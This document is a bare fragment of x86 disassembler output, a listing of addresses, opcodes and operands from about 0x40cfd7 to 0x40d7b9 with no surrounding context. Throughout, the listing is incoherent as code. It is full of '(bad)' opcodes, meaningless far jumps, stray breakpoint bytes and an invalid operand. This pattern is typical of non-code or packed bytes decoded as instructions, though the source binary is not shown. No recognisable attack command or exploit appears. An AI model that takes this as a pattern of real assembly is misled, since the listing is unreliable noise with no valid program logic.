  40cfd7:	dec    DWORD PTR [edx-0x1]
  40cfda:	int3   
  40cfdb:	(bad)  
  40cfdc:	jmp    0x7d2:0x83ff6400
  40cfe3:	add    bh,cl
  40cfe5:	or     DWORD PTR [edi+edi*8-0x5cff7c81],0x4d
  40cfed:	xor    DWORD PTR [edi+0x6b8fff83],0x0
  40cff4:	(bad)  
  40cff5:	call   FWORD PTR [ebx-0x7c7c7477]
  40cffb:	xor    BYTE PTR [eax-0x7c2c01],cl
  40d001:	ror    DWORD PTR ds:0xba00c083,0xff
  40d008:	jno    0x40d009
  40d00a:	inc    edx
  40d00c:	or     BYTE PTR [eax],al
  40d00e:	das    
  40d00f:	add    ah,cl
  40d011:	je     0x40cf9e
  40d013:	add    BYTE PTR [edx-0x1],bl
  40d016:	sub    bh,bh
  40d018:	pop    esi
  40d019:	(bad)  
  40d01a:	jmp    FWORD PTR [ebx+esi*4+0x0]
  40d01e:	stos   BYTE PTR es:[edi],al
  40d01f:	add    bh,bh
  40d021:	hlt    
  40d022:	push   esi
  40d023:	mov    edx,edi
  40d025:	jmp    DWORD PTR [edi]
  40d027:	mov    DWORD PTR [esi],esp
  40d029:	or     DWORD PTR [ecx-0x57762e91],0xffffff83
  40d030:	add    bh,bl
  40d032:	ror    DWORD PTR [ecx-0xa0068],1
  40d038:	stc    
  40d039:	dec    esp
  40d03b:	fnstcw WORD PTR [ebx]
  40d03d:	push   DWORD PTR [ebp+0x0]
  40d040:	add    BYTE PTR [edi+0x8],ah
  40d043:	add    dl,ch
  40d045:	mov    edx,ecx
  40d047:	add    BYTE PTR [ecx-0x34],cl
  40d04a:	add    dh,dl
  40d04c:	jle    0x40d04e
  40d04e:	ret    
  40d04f:	add    BYTE PTR [ebx+0x6fcc6795],al
  40d055:	sub    DWORD PTR [eax-0x1],0xffffffaf
  40d059:	inc    DWORD PTR [ebx+0x1c00fbd3]
  40d05f:	add    BYTE PTR [eax],al
  40d061:	cmc    
  40d062:	das    
  40d063:	add    BYTE PTR [edi+0x65001800],al
  40d069:	int3   
  40d06a:	add    cl,bl
  40d06c:	sar    edi,1
  40d06e:	adc    DWORD PTR [eax],eax
  40d070:	push   DWORD PTR [ebx+0x1b]
  40d073:	inc    DWORD PTR [edx-0x1]
  40d076:	xchg   DWORD PTR [eax],eax
  40d078:	sub    edi,edi
  40d07a:	call   FWORD PTR [esi]
  40d07c:	xchg   esp,ecx
  40d07e:	pop    ds
  40d07f:	int3   
  40d080:	dec    DWORD PTR [eax-0x76]
  40d083:	add    BYTE PTR [ebx-0x1],dh
  40d086:	dec    esp
  40d087:	int3   
  40d088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d089:	dec    DWORD PTR [ecx-0x87c1979]
  40d08f:	add    BYTE PTR [eax],al
  40d091:	mov    ds:0xff2cffc8,eax
  40d096:	(bad)  
  40d097:	dec    DWORD PTR [edi+edi*8-0x1]
  40d09b:	hlt    
  40d09c:	(bad)  
  40d09d:	inc    DWORD PTR [edi]
  40d09f:	add    BYTE PTR [ebx-0x2dfffd93],al
  40d0a5:	sub    edi,0xffffff83
  40d0a8:	adc    eax,0x357fffff
  40d0ad:	dec    DWORD PTR [edi-0x1]
  40d0b0:	call   DWORD PTR [eax-0x337fff57]
  40d0b6:	into   
  40d0b7:	add    BYTE PTR [esi+0x4ce400ff],bl
  40d0bd:	mov    ebp,ebx
  40d0bf:	cmp    edi,0x6f
  40d0c2:	imul   edi,edi,0x49
  40d0c5:	adc    DWORD PTR [edi-0x34],0xfffffff6
  40d0c9:	add    bh,bh
  40d0cb:	(bad)  
  40d0cc:	jb     0x40d0cd
  40d0ce:	test   al,0xff
  40d0d0:	add    al,al
  40d0d2:	add    BYTE PTR [ebx+0xce0040],0x50
  40d0d9:	add    DWORD PTR [eax],0xffffffba
  40d0dc:	sar    bh,0x9d
  40d0df:	add    ah,cl
  40d0e1:	retf   0x34
  40d0e4:	test   BYTE PTR [eax],al
  40d0e6:	pop    edi
  40d0e7:	call   edi
  40d0e9:	(bad)  
  40d0ea:	call   FWORD PTR [edi+ebx*8]
  40d0ed:	push   DWORD PTR [ecx]
  40d0ef:	(bad)  
  40d0f0:	dec    ecx
  40d0f2:	mov    ecx,DWORD PTR [ecx+0x560072]
  40d0f8:	dec    ebp
  40d0f9:	inc    DWORD PTR [ebx-0x56ff81f3]
  40d0ff:	inc    DWORD PTR [ebx-0x577caa00]
  40d105:	cmp    DWORD PTR ds:0xff89c000,0xffffffa5
  40d10c:	and    al,BYTE PTR [ebx+0x43ffffde]
  40d112:	test   bh,bh
  40d114:	in     eax,dx
  40d115:	add    BYTE PTR [ebp-0xc900],ch
  40d11b:	ja     0x40d0f8
  40d11d:	add    BYTE PTR [ecx+0x1ba100ff],ch
  40d123:	(bad)  
  40d124:	mov    esi,0xa4ffa583
  40d129:	inc    DWORD PTR [eax]
  40d12b:	sbb    bl,dh
  40d12d:	add    BYTE PTR [ecx+0x0],cl
  40d130:	add    BYTE PTR [edx+0x6ccf8],al
  40d136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d137:	add    BYTE PTR [edx-0x1],dl
  40d13a:	call   FWORD PTR [ecx+0x54]
  40d13d:	add    BYTE PTR [ebp-0x1],cl
  40d140:	add    ah,al
  40d142:	test   DWORD PTR [eax],eax
  40d144:	outs   dx,BYTE PTR ds:[esi]
  40d145:	(bad)  
  40d146:	cmp    eax,0xff0005ff
  40d14b:	sub    DWORD PTR [edi+0x0],ebp
  40d14e:	pop    eax
  40d14f:	cmp    edi,0xffffff86
  40d152:	jmp    FWORD PTR gs:[esi-0x7d]
  40d156:	arpl   WORD PTR [eax],ax
  40d158:	outs   dx,BYTE PTR ds:[esi]
  40d159:	mov    edi,edi
  40d15b:	push   ds
  40d15c:	xor    cl,ah
  40d15e:	dec    esp
  40d15f:	inc    DWORD PTR [ebx-0x3c3361be]
  40d165:	or     DWORD PTR [esi-0x1],0xffffffba
  40d169:	(bad)  
  40d16a:	push   DWORD PTR [edi-0xc57661]
  40d170:	add    bl,dl
  40d172:	jo     0x40d174
  40d174:	pop    DWORD PTR [ebx+0xaeff8c]
  40d17a:	sub    DWORD PTR [eax-0x1cffe6],0xffffffff
  40d181:	add    cl,dl
  40d183:	cmp    DWORD PTR [esp+ecx*8-0xc5ff2f],0xffffffff
  40d18b:	fs and bh,bh
  40d18e:	xchg   esp,eax
  40d18f:	add    bh,bh
  40d191:	mov    ds:0x892f838c,al
  40d196:	std    
  40d197:	add    al,cl
  40d199:	inc    DWORD PTR [ebx+0x6cff7169]
  40d19f:	int3   
  40d1a0:	or     DWORD PTR [ecx+0x6cffbb],0x62
  40d1a7:	dec    DWORD PTR [ebx+0x0]
  40d1aa:	jmp    edi
  40d1ac:	jge    0x40d1ae
  40d1ae:	rol    BYTE PTR [eax],1
  40d1b0:	sbb    DWORD PTR [edx+ebp*8-0x7d],0x7
  40d1b5:	dec    DWORD PTR [edi-0x1]
  40d1b8:	jns    0x40d13d
  40d1ba:	call   DWORD PTR [ebx-0x7ff5c]
  40d1c0:	call   DWORD PTR [esp+edi*1-0x1]
  40d1c4:	in     al,dx
  40d1c5:	call   esi
  40d1c7:	add    BYTE PTR [edx-0x77],al
  40d1ca:	mov    DWORD PTR [ecx-0x62],eax
  40d1cd:	(bad)  
  40d1ce:	cli    
  40d1cf:	int3   
  40d1d0:	(bad)  
  40d1d1:	in     eax,dx
  40d1d2:	adc    DWORD PTR [ecx+0x438367],ecx
  40d1d8:	(bad)  
  40d1da:	(bad)  
  40d1db:	cmp    DWORD PTR [ebp+0x0],edx
  40d1de:	das    
  40d1df:	mov    edi,edi
  40d1e1:	and    al,0x89
  40d1e3:	add    BYTE PTR [edi+0x44cc8300],ah
  40d1e9:	add    bh,bh
  40d1eb:	jecxz  0x40d246
  40d1ed:	call   FWORD PTR [eax+eax*1]
  40d1f0:	add    bl,ah
  40d1f2:	js     0x40d1f3
  40d1f4:	adc    al,BYTE PTR [ebx-0x337c7c2e]
  40d1fa:	add    bl,ah
  40d1fc:	xchg   BYTE PTR [ebx+0x800008b],al
  40d202:	out    0xff,al
  40d204:	loopne 0x40d189
  40d206:	jle    0x40d208
  40d208:	mov    ?,edi
  40d20a:	add    BYTE PTR [ecx+0x63],ch
  40d20d:	push   DWORD PTR [edi-0x1]
  40d210:	push   DWORD PTR [esi-0x24]
  40d213:	add    ah,cl
  40d215:	add    BYTE PTR [esi],bl
  40d217:	add    BYTE PTR [ebp-0x6b640001],bh
  40d21d:	add    BYTE PTR [ebx+0x0],dl
  40d220:	(bad)  
  40d221:	in     eax,dx
  40d222:	or     BYTE PTR [eax],al
  40d224:	jae    0x40d225
  40d226:	mov    dh,0x0
  40d228:	dec    esi
  40d229:	int3   
  40d22a:	call   DWORD PTR [edx-0x8]
  40d22d:	call   DWORD PTR [ebp-0x1]
  40d230:	call   ebp
  40d232:	outs   dx,BYTE PTR ds:[esi]
  40d233:	mov    DWORD PTR [ebx-0x1],esi
  40d236:	push   esi
  40d237:	(bad)  
  40d238:	mov    esi,0x15c83ff
  40d23d:	sbb    DWORD PTR [ecx],0xffffffcc
  40d240:	inc    ecx
  40d242:	jo     0x40d244
  40d244:	loopne 0x40d246
  40d246:	adc    DWORD PTR cs:[edi+0x0],0xffffffcc
  40d24b:	cmp    DWORD PTR [eax-0x764f01],esp
  40d251:	lods   al,BYTE PTR ds:[esi]
  40d252:	(bad)  
  40d253:	inc    ecx
  40d255:	int3   
  40d256:	(bad)  
  40d257:	call   ecx
  40d259:	mov    edi,edi
  40d25b:	xchg   edx,eax
  40d25c:	(bad)  
  40d25e:	je     0x40d25f
  40d260:	(bad)  
  40d261:	mov    ebx,0xffe0ffba
  40d266:	or     eax,0xffccff00
  40d26b:	daa    
  40d26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d26d:	call   DWORD PTR [esi]
  40d26f:	add    BYTE PTR [ebx-0x1c76ae0b],al
  40d275:	sub    DWORD PTR [esi+0xf000],0xffffffa8
  40d27c:	fld    QWORD PTR [eax]
  40d27e:	add    DWORD PTR [ebx+0xb0e7cc],eax
  40d284:	xor    al,0xff
  40d286:	outs   dx,DWORD PTR ds:[esi]
  40d287:	(bad)  
  40d288:	cmp    bh,bh
  40d28a:	push   DWORD PTR [ebp-0x8576a1]
  40d290:	sbb    DWORD PTR [edx-0x9900d0],0x28
  40d297:	int3   
  40d298:	lock add BYTE PTR [eax],al
  40d29b:	push   ebx
  40d29c:	add    DWORD PTR [eax],0xec00ffad
  40d2a2:	jp     0x40d2a3
  40d2a4:	js     0x40d2a5
  40d2a6:	pop    esi
  40d2a7:	push   DWORD PTR [edx+0x0]
  40d2aa:	add    BYTE PTR [ecx],ah
  40d2ac:	mov    bl,0xff
  40d2ae:	in     eax,dx
  40d2af:	mov    DWORD PTR [ebx-0x5576b0d4],eax
  40d2b5:	(bad)  
  40d2b6:	in     al,dx
  40d2b7:	dec    DWORD PTR [esi]
  40d2b9:	(bad)  
  40d2ba:	call   ebp
  40d2bc:	stos   DWORD PTR es:[edi],eax
  40d2bd:	add    bl,ah
  40d2bf:	add    bh,bh
  40d2c1:	xor    ebp,edi
  40d2c3:	(bad)  
  40d2c4:	sti    
  40d2c5:	push   DWORD PTR [edi]
  40d2c7:	int3   
  40d2c8:	in     eax,0xcc
  40d2ca:	inc    DWORD PTR [ebp-0x70]
  40d2cd:	add    dh,al
  40d2cf:	(bad)  
  40d2d0:	push   DWORD PTR [ebp-0x29]
  40d2d3:	(bad)  
  40d2d4:	mov    edx,0xa6ffa2ff
  40d2d9:	dec    DWORD PTR [ecx+0x5affc792]
  40d2df:	(bad)  
  40d2e0:	call   FWORD PTR [ebx+0x3d]
  40d2e3:	call   FWORD PTR [ecx+0x16830b89]
  40d2e9:	(bad)  
  40d2ea:	inc    DWORD PTR [ebx+0x97ff4b]
  40d2f0:	dec    ebp
  40d2f2:	stos   BYTE PTR es:[edi],al
  40d2f3:	dec    ecx
  40d2f5:	push   DWORD PTR [ebx]
  40d2f7:	or     DWORD PTR [ecx+0x5c698300],0xffffff89
  40d2fe:	push   0x294fff00
  40d303:	(bad)  
  40d304:	mov    eax,0x96cca400
  40d309:	cmp    edi,0xffffff9b
  40d30c:	dec    edx
  40d30d:	add    BYTE PTR [esi+0x0],bh
  40d310:	add    BYTE PTR [edx-0x1f7c41],ah
  40d316:	(bad)
  40d31a:	add    BYTE PTR ds:0x89f1fffb,dl
  40d320:	add    al,bl
  40d322:	inc    eax
  40d323:	call   DWORD PTR [edi]
  40d325:	add    BYTE PTR [eax],ch
  40d327:	inc    DWORD PTR [ebx-0x7d]
  40d32a:	dec    DWORD PTR [ebx-0x2b]
  40d32d:	or     DWORD PTR [ecx+0x4a8889ff],0xffffffff
  40d334:	sbb    al,BYTE PTR [eax]
  40d336:	add    BYTE PTR [eax],0x58
  40d339:	add    BYTE PTR [eax],al
  40d33b:	test   DWORD PTR [edi+0xff46cc],0x360062bc
  40d345:	push   eax
  40d347:	add    BYTE PTR [edx],cl
  40d349:	add    BYTE PTR [eax],al
  40d34b:	lea    edi,[eax-0xff8200]
  40d351:	outs   dx,BYTE PTR ds:[esi]
  40d352:	scas   al,BYTE PTR es:[edi]
  40d353:	push   DWORD PTR [ebx-0x7d]
  40d356:	pop    es
  40d357:	jmp    esp
  40d359:	inc    DWORD PTR [eax]
  40d35b:	loopne 0x40d3cd
  40d35d:	add    BYTE PTR [edi+edi*8],dl
  40d360:	add    BYTE PTR [edx-0x59],bh
  40d363:	int3   
  40d364:	dec    edx
  40d365:	call   DWORD PTR [ecx+0xff36ff]
  40d36b:	mov    DWORD PTR [esi-0x1],edi
  40d36e:	aas    
  40d36f:	add    BYTE PTR [ebx+0x21ff2848],al
  40d375:	add    BYTE PTR [edx],al
  40d377:	xor    DWORD PTR [edi+0x6b3dff00],0xffffffff
  40d37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d37f:	inc    DWORD PTR [ebx+0x2aff3cc2]
  40d385:	push   DWORD PTR [eax-0x401]
  40d38b:	jp     0x40d3b8
  40d38d:	jmp    DWORD PTR [ecx]
  40d38f:	inc    DWORD PTR [eax]
  40d391:	pop    es
  40d392:	imul   eax,DWORD PTR [eax],0xff590001
  40d398:	xor    DWORD PTR [eax],eax
  40d39a:	add    cl,ah
  40d39c:	add    cl,ah
  40d39e:	std    
  40d39f:	mov    DWORD PTR [eax],eax
  40d3a1:	or     al,0xfb
  40d3a3:	add    BYTE PTR [eax-0x1],ah
  40d3a6:	gs and ecx,0xffffff83
  40d3aa:	cmp    edi,0x69
  40d3ad:	add    BYTE PTR [edi+edi*8],bl
  40d3b0:	mov    DWORD PTR [ebp-0x7c0f00e8],esi
  40d3b6:	ret    0x8aff
  40d3b9:	dec    esp
  40d3bb:	pop    ecx
  40d3bc:	mov    bh,0x0
  40d3be:	aaa    
  40d3bf:	dec    DWORD PTR [ecx+0x35ffeec0]
  40d3c5:	add    BYTE PTR [eax-0x1],cl
  40d3c8:	xchg   edx,eax
  40d3c9:	add    BYTE PTR [eax],al
  40d3cb:	mov    eax,ds:0xff428974
  40d3d0:	int3   
  40d3d1:	(bad)  
  40d3d2:	ja     0x40d3d3
  40d3d4:	(bad)  
  40d3d6:	mov    edx,0xff65ff
  40d3db:	xor    al,0xe8
  40d3dd:	call   DWORD PTR [esi-0x7d]
  40d3e0:	sub    DWORD PTR [ebx+0x56],0xffffffcc
  40d3e4:	loopne 0x40d3b2
  40d3e6:	and    eax,0xff000fff
  40d3eb:	mul    ch
  40d3ed:	call   FWORD PTR ds:0xc81cccff
  40d3f3:	(bad)  
  40d3f4:	jmp    0x83:0x96ff1a83
  40d3fb:	dec    eax
  40d3fc:	cmp    DWORD PTR es:[edx+0x6075cc83],0x0
  40d404:	repz (bad) 
  40d406:	cld    
  40d407:	add    BYTE PTR [edx-0x1],dl
  40d40a:	push   DWORD PTR [ebx-0x7c]
  40d40d:	jmp    ecx
  40d40f:	(bad)  
  40d410:	jmp    FWORD PTR [edi]
  40d412:	jp     0x40d413
  40d414:	xor    eax,0x80fffaff
  40d419:	add    bh,bh
  40d41b:	push   edi
  40d41c:	test   eax,0xff8972ff
  40d421:	ins    DWORD PTR es:[edi],dx
  40d422:	push   edx
  40d423:	call   edx
  40d425:	(bad)  
  40d426:	fld    DWORD PTR [eax]
  40d428:	in     eax,0xff
  40d42a:	inc    DWORD PTR [eax-0x9500e5]
  40d430:	jmp    DWORD PTR [edi-0x76a8ff8b]
  40d436:	mov    al,BYTE PTR [eax]
  40d438:	or     edi,edi
  40d43a:	add    ah,ch
  40d43c:	ror    BYTE PTR [ecx-0x1e330073],cl
  40d442:	mov    bl,0x0
  40d444:	jbe    0x40d3cf
  40d446:	(bad)  
  40d447:	(bad)  
  40d448:	jp     0x40d44a
  40d44a:	push   DWORD PTR [eax+0x2000ff]
  40d450:	call   FWORD PTR [edi-0x5a]
  40d453:	inc    DWORD PTR [edi]
  40d455:	jmp    esp
  40d457:	add    BYTE PTR [ebp+0x26c0ffff],ch
  40d45d:	call   FWORD PTR [esi-0x75810001]
  40d463:	add    BYTE PTR [ebx],dh
  40d465:	add    BYTE PTR [ebx-0x1],al
  40d468:	out    dx,al
  40d469:	add    BYTE PTR [eax],al
  40d46b:	jae    0x40d408
  40d46d:	add    BYTE PTR [eax],bh
  40d46f:	int3   
  40d470:	add    BYTE PTR [edx-0x76ff000a],dh
  40d476:	outs   dx,DWORD PTR ds:[esi]
  40d477:	sub    eax,0x0
  40d47a:	push   DWORD PTR [ecx-0x7657009e]
  40d480:	add    BYTE PTR [esi-0x520005],bh
  40d486:	stc    
  40d487:	add    bh,dh
  40d489:	dec    DWORD PTR [ecx-0x18ffbd67]
  40d48f:	(bad)  
  40d490:	(bad)  
  40d491:	cmp    al,0xc3
  40d493:	add    BYTE PTR [ecx-0x7d],cl
  40d496:	(bad)  
  40d497:	dec    DWORD PTR [edx-0x1]
  40d49a:	add    BYTE PTR [edx-0x31],bl
  40d49d:	call   DWORD PTR ds:0x59d5ff00
  40d4a3:	sbb    DWORD PTR [ebx-0x1],0xffffff82
  40d4a7:	add    BYTE PTR [eax],al
  40d4a9:	inc    DWORD PTR [eax]
  40d4ab:	jne    0x40d525
  40d4ad:	add    DWORD PTR [ecx-0x1],0xffffff83
  40d4b1:	lds    ebx,FWORD PTR [edx-0x1]
  40d4b4:	(bad)  
  40d4b6:	in     al,dx
  40d4b7:	add    BYTE PTR [ebx],al
  40d4b9:	add    bh,bh
  40d4bb:	stos   BYTE PTR es:[edi],al
  40d4bc:	adc    BYTE PTR [eax],al
  40d4be:	xchg   edx,eax
  40d4bf:	add    BYTE PTR [eax],al
  40d4c1:	or     DWORD PTR [esi-0x77],ebx
  40d4c4:	sar    edi,1
  40d4c6:	lds    eax,FWORD PTR [ebx+0x16fffff6]
  40d4cc:	jmp    0xf924:0x83ffa3ff
  40d4d3:	inc    DWORD PTR [ebx-0x7333b700]
  40d4d9:	add    bh,bh
  40d4db:	push   ecx
  40d4dc:	pop    ecx
  40d4dd:	add    dl,bl
  40d4df:	add    bh,bh
  40d4e1:	mov    ebx,0xffd3ff46
  40d4e6:	push   ebp
  40d4e7:	add    BYTE PTR [edx],bh
  40d4e9:	(bad)  
  40d4ea:	call   FWORD PTR [ecx+0x4a]
  40d4ed:	jmp    FWORD PTR [esi-0x44e67d00]
  40d4f3:	and    DWORD PTR [ecx-0x34],0xffffffa9
  40d4f7:	cmp    edx,0xffffffcc
  40d4fa:	call   DWORD PTR [ebp+0x42]
  40d4fd:	add    dh,dh
  40d4ff:	int3   
  40d500:	push   DWORD PTR [esi-0x8100c8]
  40d506:	jo     0x40d507
  40d508:	sub    edi,edi
  40d50a:	jmp    esi
  40d50c:	sub    eax,DWORD PTR [eax]
  40d50e:	fcmove st,st(4)
  40d510:	int3   
  40d511:	in     al,0x16
  40d513:	dec    DWORD PTR [edi]
  40d515:	push   DWORD PTR [edi-0xff4034]
  40d51b:	push   cs
  40d51c:	jmp    FWORD PTR [si+0xff]
  40d521:	in     al,dx
  40d522:	jo     0x40d523
  40d524:	jae    0x40d526
  40d526:	ud0    esp,DWORD PTR ds:0x3a608900
  40d52d:	add    cl,al
  40d52f:	(bad)  
  40d530:	call   DWORD PTR [ecx+0x1c]
  40d533:	int3   
  40d534:	fdiv   st(7),st
  40d536:	fdiv   st(7),st
  40d538:	mov    edi,0xfe61ffff
  40d53d:	int3   
  40d53e:	dec    esi
  40d53f:	add    DWORD PTR [eax],0xffffffc7
  40d542:	retf   0x67ff
  40d545:	add    BYTE PTR [ecx-0x1],ch
  40d548:	inc    edi
  40d549:	inc    DWORD PTR [eax]
  40d54b:	loope  0x40d506
  40d54d:	jmp    DWORD PTR [ecx]
  40d54f:	add    DWORD PTR [ebx-0x53004387],0xffffff89
  40d556:	enter  0xc0ff,0xff
  40d55a:	mov    DWORD PTR [eax-0x8bffeb],eax
  40d560:	call   FWORD PTR [edx-0x5d]
  40d563:	dec    DWORD PTR [eax]
  40d565:	add    dh,ah
  40d567:	inc    DWORD PTR [ebx+0x26f489cc]
  40d56d:	inc    edx
  40d56f:	int3   
  40d570:	push   DWORD PTR [ebx]
  40d572:	aas    
  40d573:	add    BYTE PTR [edx-0x34],bl
  40d576:	and    al,BYTE PTR [eax]
  40d578:	adc    DWORD PTR [eax],eax
  40d57a:	add    dh,ah
  40d57c:	arpl   di,di
  40d57e:	(bad)  
  40d57f:	add    DWORD PTR [ebx+0x7000ed00],0xffffffff
  40d586:	mov    bh,bh
  40d588:	xchg   edi,eax
  40d589:	(bad)  
  40d58a:	call   DWORD PTR [ecx]
  40d58c:	dec    ebp
  40d58d:	add    BYTE PTR [eax+eax*1-0x1],dl
  40d591:	sbb    esi,DWORD PTR [edx-0x63768300]
  40d597:	(bad)  
  40d598:	mov    esi,0x5abbffff
  40d59d:	call   FWORD PTR [edi+0x0]
  40d5a0:	add    ah,bh
  40d5a2:	sar    bh,1
  40d5a4:	pop    esp
  40d5a5:	sbb    edi,0xffffffff
  40d5a8:	lods   al,BYTE PTR ds:[esi]
  40d5a9:	add    BYTE PTR [ecx+0x3e00e78b],cl
  40d5af:	add    bh,bh
  40d5b1:	sar    ecx,0x89
  40d5b4:	(bad)  
  40d5b5:	inc    DWORD PTR [eax-0xff8401]
  40d5bb:	bound  ebp,QWORD PTR [ebx+eax*4]
  40d5be:	pushf  
  40d5bf:	inc    DWORD PTR [eax]
  40d5c1:	and    DWORD PTR [ebx-0x68334500],esi
  40d5c7:	mov    DWORD PTR [ecx-0x6dc63400],esp
  40d5cd:	call   FWORD PTR [edx+0x1b3a00ff]
  40d5d3:	int3   
  40d5d4:	inc    ecx
  40d5d5:	(bad)  
  40d5d6:	mov    edx,0x83ff7283
  40d5db:	and    eax,0x59ffd0
  40d5e0:	add    dh,bh
  40d5e2:	push   esi
  40d5e3:	jmp    FWORD PTR [esi-0x1576d000]
  40d5e9:	cmp    edi,0x6c
  40d5ec:	jp     0x40d571
  40d5ee:	sub    eax,DWORD PTR [eax]
  40d5f0:	add    BYTE PTR [edx-0x7665ff7b],ch
  40d5f6:	mov    ebx,0xff83e200
  40d5fb:	add    DWORD PTR [edi],esp
  40d5fd:	jmp    DWORD PTR [ebx+0x3fb0ffff]
  40d603:	(bad)  
  40d604:	mov    ebp,0x7eff40ff
  40d609:	inc    DWORD PTR [eax]
  40d60b:	arpl   WORD PTR [ebx],sp
  40d60d:	add    BYTE PTR [esi+0x16480000],bl
  40d613:	xor    DWORD PTR [ecx+ecx*4],0x39
  40d617:	(bad)  
  40d618:	out    dx,al
  40d619:	add    BYTE PTR [ecx-0x4900313e],cl
  40d61f:	inc    DWORD PTR [eax]
  40d621:	mov    bh,0x71
  40d623:	push   DWORD PTR [edx-0xf009801]
  40d629:	add    bh,bh
  40d62b:	loopne 0x40d5ef
  40d62d:	(bad)  
  40d62e:	sti    
  40d62f:	mov    DWORD PTR [eax],eax
  40d631:	popf   
  40d632:	pusha  
  40d633:	(bad)  
  40d634:	mov    ebp,0x79ff27ff
  40d639:	(bad)  
  40d63a:	dec    DWORD PTR [ecx+0x9]
  40d63d:	push   ebp
  40d63f:	add    BYTE PTR [eax],al
  40d641:	jmp    0x18d5a3
  40d646:	ret    
  40d647:	jmp    FWORD PTR [esi]
  40d649:	inc    DWORD PTR [eax]
  40d64b:	js     0x40d5e6
  40d64d:	sbb    DWORD PTR [ecx+0x6d778389],0xffffffff
  40d654:	test   edi,edi
  40d656:	nop
  40d657:	sbb    edx,0x0
  40d65a:	add    BYTE PTR [ecx],ah
  40d65c:	dec    edi
  40d65d:	add    al,cl
  40d65f:	add    BYTE PTR [eax],al
  40d661:	or     al,0xfe
  40d663:	add    BYTE PTR [ecx+0x0],cl
  40d666:	out    0x83,eax
  40d668:	push   esi
  40d669:	add    BYTE PTR [eax],al
  40d66b:	aam    0xaa
  40d66d:	adc    DWORD PTR [edi+edi*8],0xffffffff
  40d671:	and    al,0x9e
  40d673:	(bad)  
  40d674:	jmp    0x8300:0xa4ff3d00
  40d67b:	fucomp st(0)
  40d67d:	jmp    esp
  40d67f:	(bad)  
  40d680:	(bad)  
  40d681:	mov    eax,0xff2eccf2
  40d686:	jmp    0x40138a
  40d68b:	mov    ebx,0xff84ff16
  40d690:	cmp    DWORD PTR [ebx],0x2d
  40d693:	or     DWORD PTR [esi],0xffffffff
  40d696:	or     al,0xff
  40d698:	cmp    edi,edi
  40d69a:	jmp    DWORD PTR [ecx-0x1]
  40d69d:	int3   
  40d69e:	push   ebx
  40d69f:	or     DWORD PTR [ecx-0x51338ec0],0xffffff83
  40d6a6:	pop    es
  40d6a7:	(bad)  
  40d6a8:	stc    
  40d6a9:	add    bh,bh
  40d6ab:	dec    eax
  40d6ac:	pop    esp
  40d6ad:	add    ch,ah
  40d6af:	inc    DWORD PTR [ebx+0x72ffa6b4]
  40d6b5:	call   FWORD PTR [edi]
  40d6b7:	call   FWORD PTR [edx]
  40d6b9:	add    bh,bh
  40d6bb:	xor    edi,eax
  40d6bd:	int3   
  40d6be:	and    BYTE PTR [eax],al
  40d6c0:	dec    DWORD PTR [edi]
  40d6c2:	daa    
  40d6c3:	(bad)  
  40d6c4:	clc    
  40d6c5:	inc    DWORD PTR [ecx-0x7d]
  40d6c8:	push   ds
  40d6c9:	add    bh,bh
  40d6cb:	idiv   BYTE PTR [eax]
  40d6cd:	add    bh,dl
  40d6cf:	add    ah,cl
  40d6d1:	mov    esp,0xff46896a
  40d6d6:	mov    DWORD PTR [bp-0x100],ecx
  40d6db:	add    BYTE PTR [ebx-0xbf01],cl
  40d6e1:	scas   eax,DWORD PTR es:[edi]
  40d6e2:	imul   ecx,DWORD PTR [ecx-0x7cc1ff4b],0x21ffffc6
  40d6ec:	xor    eax,0x6dcc
  40d6f1:	stos   BYTE PTR es:[edi],al
  40d6f2:	sbb    edi,edi
  40d6f4:	aaa    
  40d6f5:	sbb    ebx,0xffffffff
  40d6f8:	push   edi
  40d6f9:	mov    edi,edi
  40d6fb:	jbe    0x40d730
  40d6fd:	sbb    ebp,0xffffffcc
  40d700:	dec    DWORD PTR [ecx-0x33f17c20]
  40d706:	rol    DWORD PTR [ebx+0x19ffff19],cl
  40d70c:	fld    DWORD PTR [eax]
  40d70e:	add    al,0xff
  40d710:	sbb    DWORD PTR [edx],0xffffffad
  40d713:	dec    DWORD PTR [ebx]
  40d715:	add    BYTE PTR [ebx-0xff1f34],al
  40d71b:	sbb    ebp,ebx
  40d71d:	push   DWORD PTR [edi-0x32900100]
  40d723:	add    BYTE PTR [eax+0x0],ah
  40d726:	xor    eax,0x89002cff
  40d72b:	cmp    DWORD PTR [edi-0x1],0x5e
  40d72f:	add    bh,bh
  40d731:	xchg   esp,eax
  40d732:	jmp    0xff:0x25000583
  40d739:	mov    edi,edi
  40d73b:	or     BYTE PTR [eax+0xffd400],bl
  40d741:	loopne 0x40d703
  40d743:	call   DWORD PTR [eax-0x1]
  40d746:	and    edi,edi
  40d748:	data16 add ah,cl
  40d74b:	ins    DWORD PTR es:[edi],dx
  40d74c:	dec    ecx
  40d74d:	add    BYTE PTR [esi-0x5ad0034],al
  40d753:	or     DWORD PTR [edi],0x0
  40d756:	push   ebp
  40d757:	add    BYTE PTR [edi+edi*8-0x77],bl
  40d75b:	or     eax,0x89250079
  40d760:	sub    DWORD PTR [ecx+0x12],0x0
  40d764:	int3   
  40d765:	(bad)  
  40d766:	fdiv   st(7),st
  40d768:	push   cs
  40d769:	int3   
  40d76a:	add    BYTE PTR [edi-0xd9005c],bl
  40d770:	push   DWORD PTR [ecx]
  40d772:	addr16 call esi
  40d775:	add    BYTE PTR [eax+0x0],bl
  40d778:	mov    ch,0xff
  40d77a:	inc    DWORD PTR [esi+0x5e]
  40d77d:	call   DWORD PTR [edx-0x1c7cff01]
  40d783:	push   esp
  40d785:	push   ebp
  40d787:	mov    eax,esi
  40d789:	cmp    edi,0x5a
  40d78c:	pusha  
  40d78d:	dec    DWORD PTR [ebp-0x1]
  40d790:	call   FWORD PTR [eax+0x3a]
  40d793:	call   DWORD PTR [edx-0x577c5000]
  40d799:	inc    DWORD PTR [eax]
  40d79b:	cmp    eax,0xffcfff96
  40d7a0:	add    BYTE PTR [eax+0x28],dh
  40d7a3:	inc    DWORD PTR [ebx-0x7d]
  40d7a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a7:	mov    eax,eax
  40d7a9:	add    bh,bh
  40d7ab:	out    dx,eax
  40d7ac:	mov    ebp,0xff00d3ff
  40d7b1:	push   ecx
  40d7b2:	jmp    0xf5415783
  40d7b7:	add    BYTE PTR [ebx],dl
  40d7b9:	cmp    edi,0x1e
